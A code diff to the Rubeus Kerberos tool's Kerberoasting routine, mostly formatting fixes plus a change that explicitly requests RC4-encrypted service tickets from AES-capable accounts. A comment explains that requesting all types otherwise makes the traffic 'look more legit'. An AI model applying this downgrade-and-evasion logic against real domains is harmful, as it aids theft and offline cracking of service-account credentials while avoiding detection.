@@ -194,7 +194,7 @@ namespace Rubeus
                     }
                     Console.WriteLine();
                 }
-                return new TicketHash(hashString,Interop.KERB_ETYPE.rc4_hmac);
+                return new TicketHash(hashString, Interop.KERB_ETYPE.rc4_hmac);
             }
             else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
             {
@@ -278,7 +278,7 @@ namespace Rubeus
                     }
                     catch (Exception ex)
                     {
-                        result.HashData = new TicketHash("Error: " + ex.Message,Interop.KERB_ETYPE.unknown);
+                        result.HashData = new TicketHash("Error: " + ex.Message, Interop.KERB_ETYPE.unknown);
                     }
                     results.Add(result);
                 }
@@ -488,8 +488,8 @@ namespace Rubeus
                         if (user.ContainsKey("msds-supportedencryptiontypes"))
                         {
                             supportedETypes = (Interop.SUPPORTED_ETYPE)(int)user["msds-supportedencryptiontypes"];
-                            roastResult.SupportedEncryption = supportedETypes;
                         }
+                        roastResult.SupportedEncryption = supportedETypes;
 
                         if (!userETypes.ContainsKey(supportedETypes))
                         {
@@ -539,10 +539,12 @@ namespace Rubeus
                             bool tgsFailed = false;
                             if (TGT != null)
                             {
+                                // If we want RC4 but the account supports AES, explicitly request RC4.
+                                // Otherwise just request everything so that we look more legit and we'll still get RC4 anyway as the account doesn't support AES
                                 Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.subkey_keymaterial;
-                                if (settings.EncryptionMode == KerberoastSettings.ETypeMode.Aes &&
-                                                                (((supportedETypes & Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) ||
-                                                                ((supportedETypes & Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96)))
+                               
+                                if (settings.EncryptionMode == KerberoastSettings.ETypeMode.Rc4 && (supportedETypes.HasFlag(Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) ||
+                                                                                                    supportedETypes.HasFlag(Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96)))
                                 {
                                     etype = Interop.KERB_ETYPE.rc4_hmac;
                                 }
